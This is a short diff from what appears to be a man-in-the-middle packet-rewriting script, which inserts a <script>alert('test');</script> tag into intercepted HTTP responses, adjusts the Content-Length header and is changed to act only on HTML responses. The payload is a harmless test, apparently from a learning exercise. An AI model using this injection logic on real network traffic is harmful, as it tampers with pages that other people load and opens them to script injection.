@@ -21,7 +21,7 @@ def work_packet(packet):
             insert = "<script>alert('test');</script>"
             raw_load = raw_load.replace("</body>", insert + "</body>")
             content_len = re.search("(?:Content-Length:\s)(\d*)", raw_load)
-            if content_len:
+            if content_len and "text/html" in raw_load:
                 leng = content_len.group(1)
                 new_leng = int(leng) + len(insert)
                 raw_load = raw_load.replace(leng, str(new_leng))
